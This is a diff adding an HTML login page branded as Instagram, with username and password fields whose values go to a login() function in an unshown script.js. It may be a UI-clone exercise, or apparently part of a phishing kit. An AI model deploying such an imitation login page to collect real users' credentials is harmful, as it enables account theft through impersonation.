@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="container">
+    <div class="login-box">
+      <h1 class="logo">Instagram</h1>
+
+      <!-- IDs are REQUIRED -->
+      <input type="text" id="username" placeholder="Username">
+      <input type="password" id="password" placeholder="Password">
+
+      <!-- Call login() -->
+      <button class="login-log" onclick="login()">Log in</button>
+
+      <div class="divider">
+        <span></span>
+        <p>OR</p>
+        <span></span>
+      </div>
+
+      <a href="forgot.html" class="forgot">Forgot password?</a>
+    </div>
+
+    <div class="signup-box">
+      <p>Don't have an account?
+        <a href="signup.html">Sign up</a>
+      </p>
+    </div>
+  </div>
+
+  <!-- IMPORTANT -->
+  <script src="script.js"></script>
+
+</body>
+</html>
